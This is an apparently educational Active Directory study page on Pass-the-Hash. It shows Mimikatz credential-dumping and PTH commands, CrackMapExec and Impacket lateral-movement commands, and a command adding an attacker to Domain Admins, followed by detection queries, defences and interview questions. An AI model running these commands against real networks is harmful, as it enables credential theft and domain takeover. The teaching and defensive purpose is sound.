# 03 — Pass-the-Hash (PtH)

> **Section:** 05 — AD Attack Techniques  
> **Difficulty:** Intermediate  
> **Protocol exploited:** NTLM

---

## 📌 What is Pass-the-Hash?

In NTLM authentication, Windows uses the **password hash** to compute the authentication response — not the actual password. This means: **if you have the hash, you can authenticate as that user without ever knowing their password.**

> **Simple definition:**  
> Pass-the-Hash (PtH) is an attack where an attacker steals an NTLM password hash from memory and uses it directly to authenticate as that user — bypassing the need to know the actual password.

---

## ⚙️ How It Works

```
Normal NTLM authentication:
  User types password → Windows computes NTLM hash
  Hash used to compute authentication response → sent to server

Pass-the-Hash:
  Attacker steals the NTLM hash (skips the password entirely)
  Uses hash directly to compute authentication response
  Server cannot tell the difference → access granted ✅
```

### Step-by-Step Attack

```
Step 1: Compromise a machine (Hareesh's workstation via phishing)
        Attacker has SYSTEM or SeDebugPrivilege

Step 2: Dump credentials from LSASS using Mimikatz
  mimikatz.exe
  privilege::debug
  sekurlsa::logonpasswords

  Output:
  Authentication Id : 0 ; 3729456
  Session           : Interactive from 2
  User Name         : GP
  Domain            : COMPANY
  Logon Server      : DC01
  NT                : 8f4b2c9d3e1a7f6b4d2e8c1a3b9f5e7d  ← GP's NTLM hash
  
  ← GP logged into this machine earlier to fix something
  ← Her hash is now cached in LSASS

Step 3: Use GP's hash to authenticate elsewhere
  Option A — Mimikatz PTH (spawns cmd with GP's identity):
  sekurlsa::pth /user:gp-t0 /domain:company.local \
      /ntlm:8f4b2c9d3e1a7f6b4d2e8c1a3b9f5e7d /run:cmd.exe
  
  Option B — CrackMapExec (lateral movement to all machines):
  crackmapexec smb 192.168.1.0/24 \
      -u gp-t0 -H 8f4b2c9d3e1a7f6b4d2e8c1a3b9f5e7d \
      --local-auth
  
  Option C — Impacket (remote command execution):
  python3 wmiexec.py company.local/gp-t0@DC01 \
      -hashes :8f4b2c9d3e1a7f6b4d2e8c1a3b9f5e7d

Step 4: Full access as GP (Domain Admin)
  dir \\DC01\C$ ← access to DC ✅
  net group "Domain Admins" attacker /add /domain ← add own account ✅
```

---

## 🔍 Detection

```
Event ID 4624 — Successful logon
  Watch for:
  → LogonType 3 (network) with NtLmSsp authentication package
  → Domain Admin accounts authenticating from workstations
  → Accounts logging into many machines in quick succession

Event ID 4776 — NTLM credential validation
  → Watch for admin accounts validating from unusual sources

Defender for Identity:
  → "Pass-the-Hash activity" alert (automatic detection)
  → Alerts when account uses NTLM from a different machine

KQL for Sentinel:
  SecurityEvent
  | where EventID == 4624
  | where AuthenticationPackageName == "NTLM"
  | where TargetUserName in (domain_admins_list)
  | where WorkstationName !in (known_admin_workstations)
```

---

## 🛡️ Defence

```
1. Credential Guard — prevents hash extraction from LSASS
   (Section 04-04) — most effective single control

2. Protected Users group — blocks NTLM auth for members
   Add all admin accounts to Protected Users
   
3. Tiered Admin Model — admins never log into workstations
   GP's hash cannot be on Hareesh's workstation if GP never logs in there
   
4. LAPS — unique local admin passwords
   Stops lateral movement via local admin hash

5. Disable NTLM where possible
   Force Kerberos for all internal authentication
   
6. Monitor for NTLM authentication from privileged accounts
```

---

## 🎯 Key Interview Questions

**Q: What is Pass-the-Hash and why can't changing the password stop it?**  
**A:** PtH uses the NTLM hash directly for authentication — the hash IS the credential. Changing the password changes the hash, but attackers often capture the new hash shortly after (from the next NTLM authentication event). True defence requires eliminating NTLM authentication (Protected Users group blocks NTLM for members) or preventing hash extraction (Credential Guard isolates LSASS).

**Q: How does Credential Guard specifically stop Pass-the-Hash?**  
**A:** Credential Guard moves credential storage into a virtualised Secure World (Isolated LSA) that the normal OS cannot access. When Mimikatz attempts to read LSASS memory, it only finds encrypted blobs — no usable hashes. Without the hash, Pass-the-Hash is not possible.

---

*"Pass-the-Hash is why 'just change the password' is never enough. The hash is the password in NTLM. Eliminate NTLM or protect the hash — there is no middle ground."*
